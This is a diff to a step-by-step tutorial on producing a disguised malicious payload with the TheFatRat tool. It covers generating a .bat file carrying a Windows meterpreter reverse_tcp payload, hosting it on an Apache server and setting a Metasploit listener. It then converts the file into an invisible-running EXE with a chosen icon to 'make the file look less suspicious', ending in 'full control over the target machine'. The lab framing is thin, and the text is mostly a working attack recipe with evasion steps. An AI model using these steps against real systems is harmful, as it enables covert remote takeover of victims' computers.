@@ -4,7 +4,74 @@ CREATING AN UNDETECTABLE PAYLOAD USING FATRAT
 you'd have to install it first.
 
 - First, you'd have to clone the repo from GitHub.
+1. Open the terminal and navigate to the directory you'd want
+to download it at eg. '/home/kali/tools'
+Then, enter the command below:
 $ git clone https://github.com/Screetsec/TheFatRat.git
 
-cd TheFatRat
-chmod +x setup.sh && ./setup.sh
+2. Change directory to 'TheFatRat' folder.
+$ cd TheFatRat
+
+3. Add execution permission to the 'setup.sh' file.
+chmod +x setup.sh 
+
+4. Run the installer 'setup.sh' file
+$ ./setup.sh
+
+- After installation, run the tool
+$ fatrat
+
+- A) Creating a malicious file
+* Select option 6
+* Select option 1 (creates a .bat file)
+* Set LHOST IP:
+ Type your local IP address (can be found by using the command, $ ifconfig)
+* Set LPORT:
+ 8080
+
+* Enter a name for your output file. eg. "setup"
+* Select payload number 3
+
+- After the file is generated, navigate to where the output file is.
+Open another terminal window and type:
+$ cd /home/kali/tools/TheFatRat/output
+
+- You'd find the 'setup.bat' file there. Copy it to the default
+root folder of the Apache web server.
+$ cp setup.bat /var/www/html
+
+- Set the listener
+$ msfconsole
+
+Then, enter the following commands.
+msf5 > use exploit/multi/handler
+msf5 > set payload windows/meterpreter/reverse_tcp
+msf5 > set LHOST {your-local-IP address}
+msf5 > set LPORT 8080
+
+- To begin listening for connections
+msf5 > run
+
+--> Switch from Kali VM to Windows machine <--
+- Open a web browser
+- Enter the local IP address of your Kali machine
+(in the search bar): {local-IP}
+- You see the .bat file 'setup.bat'
+- Save the file.
+
+- MAKE THE FILE LOOK LESS SUSPICIOUS
+* Use a program called "Advanced BAT to EXE converter"
+* Download and install the program first.
+* After installing the program;
+* Go to "File" and select "Open" to select the 'setup.bat' file.
+* Click "File" again and select "Build EXE"
+* Check the "Start invisible" box.
+* Go to "Select icon" to select any icon of your choice.
+* Click "Build EXE".
+* Type the file name and select the location to save the file.
+* Click "Save"
+
+- Run the file.
+- This will launch a session in your Kali machine.
+
+You now have full control over the target machine. Yayyyy!
